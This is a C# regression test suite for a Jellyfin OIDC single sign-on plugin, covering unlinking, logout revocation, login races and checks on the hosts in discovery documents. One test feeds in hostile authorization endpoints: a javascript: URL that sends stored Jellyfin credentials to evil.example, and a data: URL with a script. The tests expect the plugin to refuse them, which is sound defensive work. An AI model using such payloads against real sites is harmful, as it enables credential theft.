using System.Net;
using System.Net.Http.Headers;
using System.Reflection;
using Jellyfin.Data;
using Jellyfin.Database.Implementations.Entities;
using Jellyfin.Database.Implementations.Enums;
using Jellyfin.Plugin.Sso.Auth;
using Jellyfin.Plugin.Sso.Configuration;
using Jellyfin.Plugin.Sso.Oidc;
using Jellyfin.Plugin.Sso.Provisioning;
using Jellyfin.Plugin.Sso.Web;
using MediaBrowser.Controller;
using MediaBrowser.Controller.Configuration;
using MediaBrowser.Controller.Library;
using MediaBrowser.Controller.Providers;
using MediaBrowser.Controller.Session;
using MediaBrowser.Model.Users;
using Microsoft.Extensions.Logging.Abstractions;
using NSubstitute;

namespace Jellyfin.Plugin.Sso.Tests;

// Regression tests for the November 10 security review.
public sealed class SecurityRegressionTests
{
    [Fact]
    public async Task Unlink_must_invalidate_unspent_bridge_credentials()
    {
        using var harness = new PluginHarness();
        var account = Guid.NewGuid();
        harness.Configuration.Links.Add(new LinkConfig { ProviderId = "p", Sub = "s", JellyfinUserId = account });
        var secrets = new EphemeralSecretStore();
        var credential = secrets.Issue(account, "alice");
        var revoker = new SessionRevoker(Substitute.For<ISessionManager>(), NullLogger<SessionRevoker>.Instance);
        await new Unlinking(revoker, NullLogger.Instance).RemoveAsync(account, "p", default);
        Assert.Empty(harness.Configuration.Links);
        Assert.Null(secrets.Consume(credential));
    }

    [Fact]
    public async Task Backchannel_logout_must_invalidate_pending_quick_connect_approvals()
    {
        using var harness = new PluginHarness();
        var account = Guid.NewGuid();
        harness.Configuration.Links.Add(new LinkConfig { ProviderId = "p", Sub = "s", JellyfinUserId = account });
        var approvals = new QuickConnectApprovalStore();
        var token = approvals.Issue(account, "alice", "123456");
        var revoker = new SessionRevoker(Substitute.For<ISessionManager>(), NullLogger<SessionRevoker>.Instance);
        Assert.Equal(1, await revoker.RevokeAsync("p", "s"));
        Assert.Null(approvals.Consume(token));
    }

    [Fact]
    public async Task Jit_and_self_service_link_must_not_create_two_owners_for_one_identity()
    {
        using var harness = new PluginHarness();
        var users = Substitute.For<IUserManager>();
        var created = new User("new-user", "local", "reset");
        var createEntered = new TaskCompletionSource(TaskCreationOptions.RunContinuationsAsynchronously);
        var resumeCreate = new TaskCompletionSource<User>(TaskCreationOptions.RunContinuationsAsynchronously);
        var persistence = Substitute.For<ISsoUserPersistence>();
        persistence.CreateAsync("new-user", Arg.Any<CancellationToken>()).Returns(_ => { createEntered.SetResult(); return resumeCreate.Task; });
        var resolve = new UserProvisioner(users, NullLogger<UserProvisioner>.Instance, persistence)
            .ResolveAsync(new ProviderConfig { Id = "p" }, new OidcIdentity("subject", "new-user", []));
        await createEntered.Task.WaitAsync(TimeSpan.FromSeconds(5));
        var decision = SelfServiceLinks.Attach(harness.Configuration, "p", "subject", Guid.NewGuid());
        Assert.Equal(SelfServiceLinkOutcome.Write, decision.Outcome);
        resumeCreate.SetResult(created);
        await Assert.ThrowsAsync<LoginRaceException>(() => resolve);
        await users.Received(1).DeleteUserAsync(created.Id);
        Assert.Single(harness.Configuration.Links, l => l.ProviderId == "p" && l.Sub == "subject");
    }

    [Fact]
    public async Task Discovery_must_check_the_jwks_host_before_sending_the_request()
    {
        using var factory = new OidcClientFactory(NullLogger<OidcClientFactory>.Instance);
        var requests = new List<string>();
        using var client = new HttpClient(new Handler(request => {
            requests.Add(request.RequestUri!.Host);
            var json = request.RequestUri.Host == "idp.example"
                ? "{\"issuer\":\"https://idp.example\",\"jwks_uri\":\"https://internal.example/keys\"}"
                : "{\"keys\":[]}";
            return Task.FromResult(new HttpResponseMessage(HttpStatusCode.OK) { Content = new StringContent(json) });
        }));
        typeof(OidcClientFactory).GetField("_http", BindingFlags.NonPublic | BindingFlags.Instance)!.SetValue(factory, client);
        await Assert.ThrowsAsync<InvalidOperationException>(() => factory.GetDiscoveryDocumentAsync(new ProviderConfig {
            Id = "p", Authority = "https://idp.example"
        }));
        Assert.DoesNotContain("internal.example", requests);
    }

    [Fact]
    public async Task Shared_authentik_endpoint_paths_are_allowed_on_the_configured_origin()
    {
        using var factory = new OidcClientFactory(NullLogger<OidcClientFactory>.Instance);
        var requests = new List<string>();
        using var client = new HttpClient(new Handler(request =>
        {
            requests.Add(request.RequestUri!.AbsolutePath);
            var json = request.RequestUri.AbsolutePath.EndsWith("openid-configuration", StringComparison.Ordinal)
                ? """{"issuer":"https://idp.example/application/o/jellyfin/","jwks_uri":"https://idp.example/application/o/keys/","token_endpoint":"https://idp.example/application/o/token/","authorization_endpoint":"https://login.example/authorize"}"""
                : """{"keys":[]}""";
            return Task.FromResult(new HttpResponseMessage(HttpStatusCode.OK) { Content = new StringContent(json) });
        }));
        typeof(OidcClientFactory).GetField("_http", BindingFlags.NonPublic | BindingFlags.Instance)!.SetValue(factory, client);

        var document = await factory.GetDiscoveryDocumentAsync(new ProviderConfig
            { Id = "authentik", Authority = "https://idp.example/application/o/jellyfin/" });

        Assert.False(document.IsError);
        Assert.Equal(["/application/o/jellyfin/.well-known/openid-configuration", "/application/o/keys/"], requests);
    }

    [Fact]
    public async Task Endpoints_the_plugin_never_calls_may_live_on_another_host()
    {
        using var factory = new OidcClientFactory(NullLogger<OidcClientFactory>.Instance);
        using var client = new HttpClient(new Handler(request =>
        {
            var json = request.RequestUri!.AbsolutePath.EndsWith("openid-configuration", StringComparison.Ordinal)
                ? """{"issuer":"https://idp.example","jwks_uri":"https://idp.example/keys","token_endpoint":"https://idp.example/token","device_authorization_endpoint":"https://device.example/device","introspection_endpoint":"https://idp.example:8443/introspect","check_session_iframe":"https://session.example/iframe"}"""
                : """{"keys":[]}""";
            return Task.FromResult(new HttpResponseMessage(HttpStatusCode.OK) { Content = new StringContent(json) });
        }));
        typeof(OidcClientFactory).GetField("_http", BindingFlags.NonPublic | BindingFlags.Instance)!.SetValue(factory, client);

        var document = await factory.GetDiscoveryDocumentAsync(new ProviderConfig { Id = "p", Authority = "https://idp.example" });

        Assert.False(document.IsError, document.Error);
    }

    [Fact]
    public async Task An_authority_typed_with_capitals_matches_endpoints_published_the_same_way()
    {
        using var factory = new OidcClientFactory(NullLogger<OidcClientFactory>.Instance);
        using var client = new HttpClient(new Handler(request =>
        {
            var json = request.RequestUri!.AbsolutePath.EndsWith("openid-configuration", StringComparison.Ordinal)
                ? """{"issuer":"https://IdP.example","jwks_uri":"https://IdP.example/keys","token_endpoint":"https://IdP.example/token"}"""
                : """{"keys":[]}""";
            return Task.FromResult(new HttpResponseMessage(HttpStatusCode.OK) { Content = new StringContent(json) });
        }));
        typeof(OidcClientFactory).GetField("_http", BindingFlags.NonPublic | BindingFlags.Instance)!.SetValue(factory, client);

        var document = await factory.GetDiscoveryDocumentAsync(new ProviderConfig { Id = "p", Authority = "https://IdP.example" });

        Assert.False(document.IsError, document.Error);
    }

    [Fact]
    public async Task A_token_endpoint_on_another_host_is_still_refused()
    {
        using var factory = new OidcClientFactory(NullLogger<OidcClientFactory>.Instance);
        var requests = new List<string>();
        using var client = new HttpClient(new Handler(request =>
        {
            requests.Add(request.RequestUri!.Host);
            var json = request.RequestUri.AbsolutePath.EndsWith("openid-configuration", StringComparison.Ordinal)
                ? """{"issuer":"https://idp.example","jwks_uri":"https://idp.example/keys","token_endpoint":"https://attacker.example/token"}"""
                : """{"keys":[]}""";
            return Task.FromResult(new HttpResponseMessage(HttpStatusCode.OK) { Content = new StringContent(json) });
        }));
        typeof(OidcClientFactory).GetField("_http", BindingFlags.NonPublic | BindingFlags.Instance)!.SetValue(factory, client);

        await Assert.ThrowsAsync<InvalidOperationException>(() =>
            factory.GetDiscoveryDocumentAsync(new ProviderConfig { Id = "p", Authority = "https://idp.example" }));
        Assert.DoesNotContain("attacker.example", requests);
    }

    [Theory]
    [InlineData("javascript:fetch('//evil.example/'+localStorage.jellyfin_credentials)//")]
    [InlineData("data:text/html,<script>alert(1)</script>")]
    [InlineData("//evil.example/authorize")]
    [InlineData("/authorize")]
    [InlineData("https://user:pass@idp.example/authorize")]
    [InlineData("https://idp.example/authorize#fragment")]
    public async Task An_authorization_endpoint_a_browser_should_not_be_sent_to_is_refused(string endpoint)
    {
        // #339: the link page navigates to it from script, on Jellyfin's own origin.
        using var factory = new OidcClientFactory(NullLogger<OidcClientFactory>.Instance);
        var document = System.Text.Json.JsonSerializer.Serialize(new Dictionary<string, string>
        {
            ["issuer"] = "https://idp.example",
            ["jwks_uri"] = "https://idp.example/keys",
            ["token_endpoint"] = "https://idp.example/token",
            ["authorization_endpoint"] = endpoint,
        });
        using var client = new HttpClient(new Handler(request =>
        {
            var json = request.RequestUri!.AbsolutePath.EndsWith("openid-configuration", StringComparison.Ordinal)
                ? document
                : """{"keys":[]}""";
            return Task.FromResult(new HttpResponseMessage(HttpStatusCode.OK) { Content = new StringContent(json) });
        }));
        typeof(OidcClientFactory).GetField("_http", BindingFlags.NonPublic | BindingFlags.Instance)!.SetValue(factory, client);

        await Assert.ThrowsAsync<InvalidOperationException>(() =>
            factory.GetDiscoveryDocumentAsync(new ProviderConfig { Id = "p", Authority = "https://idp.example" }));
        Assert.Throws<InvalidOperationException>(() => OidcClientFactory.NavigableAuthorizeEndpoint(endpoint));
    }

    [Theory]
    [InlineData("https://login.example/authorize")]
    [InlineData("http://idp.lan:9000/application/o/authorize/")]
    [InlineData("https://accounts.google.com/o/oauth2/v2/auth")]
    public void An_ordinary_authorization_endpoint_on_any_host_is_accepted(string endpoint)
        => Assert.Equal(new Uri(endpoint), OidcClientFactory.NavigableAuthorizeEndpoint(endpoint));

    private const string GoogleDocument ="""{"issuer":"https://accounts.google.com","authorization_endpoint":"https://accounts.google.com/o/oauth2/v2/auth","device_authorization_endpoint":"https://oauth2.googleapis.com/device/code","token_endpoint":"https://oauth2.googleapis.com/token","userinfo_endpoint":"https://openidconnect.googleapis.com/v1/userinfo","revocation_endpoint":"https://oauth2.googleapis.com/revoke","jwks_uri":"https://www.googleapis.com/oauth2/v3/certs"}""";

    private const string PlainDocument = """{"issuer":"https://idp.example","jwks_uri":"https://idp.example/keys","token_endpoint":"https://idp.example/token"}""";

    private static (OidcClientFactory Factory, HttpClient Client, List<string> Requests) GoogleShaped()
    {
        var factory = new OidcClientFactory(NullLogger<OidcClientFactory>.Instance);
        var requests = new List<string>();
        var client = new HttpClient(new Handler(request =>
        {
            requests.Add(request.RequestUri!.Host);
            var json = request.RequestUri.AbsolutePath.EndsWith("openid-configuration", StringComparison.Ordinal)
                ? request.RequestUri.Host == "accounts.google.com" ? GoogleDocument : PlainDocument
                : """{"keys":[]}""";
            return Task.FromResult(new HttpResponseMessage(HttpStatusCode.OK) { Content = new StringContent(json) });
        }));
        typeof(OidcClientFactory).GetField("_http", BindingFlags.NonPublic | BindingFlags.Instance)!.SetValue(factory, client);
        return (factory, client, requests);
    }

    /// <summary>
    /// The shape of Google's own document, through the real fetch: refused with nothing
    /// asked of the other hosts, and refused in the plugin's words rather than the
    /// library's, because only those say what to do about it.
    /// </summary>
    [Fact]
    public async Task Googles_document_is_refused_by_name_until_its_hosts_are_named()
    {
        var (factory, client, requests) = GoogleShaped();
        using var _ = factory;
        using var __ = client;

        var ex = await Assert.ThrowsAsync<InvalidOperationException>(() => factory.GetDiscoveryDocumentAsync(
            new ProviderConfig { Id = "google", Authority = "https://accounts.google.com" }));

        Assert.Contains("Further endpoint hosts", ex.Message, StringComparison.Ordinal);
        Assert.EndsWith("www.googleapis.com oauth2.googleapis.com openidconnect.googleapis.com", ex.Message, StringComparison.Ordinal);
        Assert.Equal(["accounts.google.com"], requests);
    }

    [Fact]
    public async Task Googles_document_is_accepted_with_its_hosts_named_and_the_keys_come_from_there()
    {
        var (factory, client, requests) = GoogleShaped();
        using var _ = factory;
        using var __ = client;

        var document = await factory.GetDiscoveryDocumentAsync(new ProviderConfig
        {
            Id = "google",
            Authority = "https://accounts.google.com",
            EndpointHosts = ["www.googleapis.com", "oauth2.googleapis.com", "openidconnect.googleapis.com"],
        });

        Assert.False(document.IsError, document.Error);
        Assert.Equal("https://oauth2.googleapis.com/token", document.TokenEndpoint);
        Assert.Equal(["accounts.google.com", "www.googleapis.com"], requests);
    }

    /// <summary>
    /// Naming the key host does not admit the token host: the document is refused before
    /// the keys are fetched from the host that was named.
    /// </summary>
    [Fact]
    public async Task Naming_one_host_does_not_admit_the_others()
    {
        var (factory, client, requests) = GoogleShaped();
        using var _ = factory;
        using var __ = client;

        var ex = await Assert.ThrowsAsync<InvalidOperationException>(() => factory.GetDiscoveryDocumentAsync(
            new ProviderConfig { Id = "google", Authority = "https://accounts.google.com", EndpointHosts = ["www.googleapis.com"] }));

        Assert.EndsWith("oauth2.googleapis.com openidconnect.googleapis.com", ex.Message, StringComparison.Ordinal);
        Assert.Equal(["accounts.google.com"], requests);
    }

    /// <summary>
    /// A host taken off the list stops being trusted with the save, not half an hour
    /// later when the document accepted with it leaves the cache.
    /// </summary>
    [Fact]
    public async Task A_host_taken_off_the_list_is_not_served_from_the_cache()
    {
        var (factory, client, _) = GoogleShaped();
        using var __ = factory;
        using var ___ = client;
        var provider = new ProviderConfig
        {
            Id = "google",
            Authority = "https://accounts.google.com",
            EndpointHosts = ["www.googleapis.com", "oauth2.googleapis.com", "openidconnect.googleapis.com"],
        };
        Assert.False((await factory.GetDiscoveryDocumentAsync(provider)).IsError);

        provider.EndpointHosts = [];

        await Assert.ThrowsAsync<InvalidOperationException>(() => factory.GetDiscoveryDocumentAsync(provider));
    }

    /// <summary>
    /// A key rotation is answered by dropping the cached document, and that has to work
    /// for a provider with further hosts as it does for one without. The first version of
    /// the host list put it into the cache key, which only the fetch then knew about:
    /// the drop missed, and every login after a rotation was checked against the old
    /// keys. The end-to-end suite found it; this is the test that should have.
    /// </summary>
    [Theory]
    [InlineData(false)]
    [InlineData(true)]
    public async Task A_forgotten_document_is_fetched_again(bool withFurtherHosts)
    {
        var (factory, client, requests) = GoogleShaped();
        using var _ = factory;
        using var __ = client;
        var provider = withFurtherHosts
            ? new ProviderConfig
            {
                Id = "google",
                Authority = "https://accounts.google.com",
                EndpointHosts = ["www.googleapis.com", "oauth2.googleapis.com", "openidconnect.googleapis.com"],
            }
            : new ProviderConfig { Id = "plain", Authority = "https://idp.example" };

        await factory.GetDiscoveryDocumentAsync(provider);
        await factory.GetDiscoveryDocumentAsync(provider);
        var cached = requests.Count;

        factory.Forget(provider);
        await factory.GetDiscoveryDocumentAsync(provider);

        Assert.Equal(2, cached);
        Assert.Equal(4, requests.Count);
    }

    /// <summary>
    /// The back-channel logout endpoint is anonymous, and a token naming a key nobody
    /// published made it drop the cached document before fetching a new one. A fetch
    /// that then failed — a provider throttling the server, which is what a stream of
    /// such tokens invites — left every login and logout without a document (#316).
    /// </summary>
    [Fact]
    public async Task A_failed_refresh_keeps_the_document_logins_use()
    {
        var failing = false;
        var requests = 0;
        using var factory = new OidcClientFactory(NullLogger<OidcClientFactory>.Instance);
        using var client = new HttpClient(new Handler(request =>
        {
            Interlocked.Increment(ref requests);
            if (failing)
                return Task.FromResult(new HttpResponseMessage(HttpStatusCode.TooManyRequests));
            var json = request.RequestUri!.AbsolutePath.EndsWith("openid-configuration", StringComparison.Ordinal)
                ? PlainDocument
                : """{"keys":[]}""";
            return Task.FromResult(new HttpResponseMessage(HttpStatusCode.OK) { Content = new StringContent(json) });
        }));
        typeof(OidcClientFactory).GetField("_http", BindingFlags.NonPublic | BindingFlags.Instance)!.SetValue(factory, client);
        var provider = new ProviderConfig { Id = "plain", Authority = "https://idp.example" };

        var before = await factory.GetDiscoveryDocumentAsync(provider);
        failing = true;
        await Assert.ThrowsAsync<InvalidOperationException>(() => factory.RefreshAsync(provider));
        var fetched = requests;

        Assert.Same(before, await factory.GetDiscoveryDocumentAsync(provider));
        Assert.Equal(fetched, requests);
    }

    /// <summary>
    /// Tokens posted at the same time share one fetch rather than each costing the
    /// provider two requests (#316).
    /// </summary>
    [Fact]
    public async Task Refreshes_asked_for_at_the_same_time_share_one_fetch()
    {
        var gate = new TaskCompletionSource();
        var discoveries = 0;
        using var factory = new OidcClientFactory(NullLogger<OidcClientFactory>.Instance);
        using var client = new HttpClient(new Handler(async request =>
        {
            var discovery = request.RequestUri!.AbsolutePath.EndsWith("openid-configuration", StringComparison.Ordinal);
            if (discovery)
            {
                Interlocked.Increment(ref discoveries);
                await gate.Task;
            }
            return new HttpResponseMessage(HttpStatusCode.OK)
            {
                Content = new StringContent(discovery ? PlainDocument : """{"keys":[]}"""),
            };
        }));
        typeof(OidcClientFactory).GetField("_http", BindingFlags.NonPublic | BindingFlags.Instance)!.SetValue(factory, client);
        var provider = new ProviderConfig { Id = "plain", Authority = "https://idp.example" };

        var refreshes = Enumerable.Range(0, 5).Select(_ => factory.RefreshAsync(provider)).ToList();
        gate.SetResult();
        var documents = await Task.WhenAll(refreshes);

        Assert.Equal(1, discoveries);
        Assert.All(documents, d => Assert.Same(documents[0], d));
    }

    [Fact]
    public void A_whole_configuration_saved_through_jellyfin_keeps_the_live_links()
    {
        using var harness = new PluginHarness();
        var live = new LinkConfig { ProviderId = "p", Sub = "s", JellyfinUserId = Guid.NewGuid() };
        harness.Configuration.Links.Add(live);

        harness.Plugin.UpdateConfiguration(new PluginConfiguration
        {
            Links = [new LinkConfig { ProviderId = "p", Sub = "other", JellyfinUserId = Guid.NewGuid() }],
        });

        Assert.Equal([live], harness.Plugin.Configuration.Links);
    }

    private sealed class Handler(Func<HttpRequestMessage, Task<HttpResponseMessage>> respond) : HttpMessageHandler
    {
        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken ct) => respond(request);
    }
}
